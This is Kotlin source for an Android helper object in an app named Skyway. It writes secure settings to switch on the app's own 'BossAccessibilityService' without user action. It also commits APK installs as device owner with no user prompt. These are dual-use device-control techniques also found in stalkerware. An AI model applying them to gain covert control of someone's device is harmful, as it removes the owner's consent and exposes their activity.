package com.vskyway.security

import android.Manifest
import android.app.PendingIntent
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.ContentResolver
import android.content.Intent
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import android.util.Log
import com.vskyway.admin.SkywayDeviceAdminReceiver
import java.io.File
import java.io.FileInputStream

object SystemPrivilegeHelper {

    private const val TAG = "SkywaySysPriv"
    private const val A11Y_SERVICE_ID = "com.vskyway/.accessibility.BossAccessibilityService"

    fun hasSecureSettingsPermission(context: Context): Boolean =
        context.checkSelfPermission(Manifest.permission.WRITE_SECURE_SETTINGS) ==
            PackageManager.PERMISSION_GRANTED

    fun isAccessibilityEnabled(context: Context): Boolean {
        val enabled = Settings.Secure.getString(
            context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabled.split(":").contains(A11Y_SERVICE_ID)
    }

    fun trySilentEnableAccessibility(context: Context): Boolean {
        if (!hasSecureSettingsPermission(context)) {
            Log.w(TAG, "WRITE_SECURE_SETTINGS not granted — run adb grant command first")
            return false
        }
        val resolver = context.contentResolver
        val existing = Settings.Secure.getString(
            resolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: ""

        if (existing.split(":").contains(A11Y_SERVICE_ID)) {
            setMasterSwitch(resolver)
            return true
        }

        val updated = if (existing.isBlank()) A11Y_SERVICE_ID else "$existing:$A11Y_SERVICE_ID"

        return try {
            Settings.Secure.putString(resolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, updated)
            setMasterSwitch(resolver)
            true
        } catch (e: SecurityException) {
            Log.e(TAG, "Secure settings write failed: ${e.message}")
            false
        }
    }

    private fun setMasterSwitch(resolver: ContentResolver) {
        Settings.Secure.putInt(resolver, Settings.Secure.ACCESSIBILITY_ENABLED, 1)
    }

    fun isDeviceOwner(context: Context): Boolean {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        return dpm.isDeviceOwnerApp(context.packageName)
    }

    fun adminComponent(context: Context): ComponentName =
        ComponentName(context, SkywayDeviceAdminReceiver::class.java)

    fun silentInstall(context: Context, apkFile: File, onResult: (Boolean, String) -> Unit) {
        if (!isDeviceOwner(context)) {
            onResult(false, "Not device owner — cannot silent install")
            return
        }
        try {
            val installer = context.packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
            }
            val sessionId = installer.createSession(params)
            installer.openSession(sessionId).use { session ->
                session.openWrite("skyway_update", 0, apkFile.length()).use { out ->
                    FileInputStream(apkFile).use { it.copyTo(out) }
                    session.fsync(out)
                }
                val pi = PendingIntent.getBroadcast(
                    context, sessionId, Intent(context, SkywayDeviceAdminReceiver::class.java),
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
                )
                session.commit(pi.intentSender)
            }
            onResult(true, "Install session committed (id=$sessionId)")
        } catch (e: Exception) {
            Log.e(TAG, "Silent install failed: ${e.message}")
            onResult(false, "Silent install failed: ${e.message}")
        }
    }
}
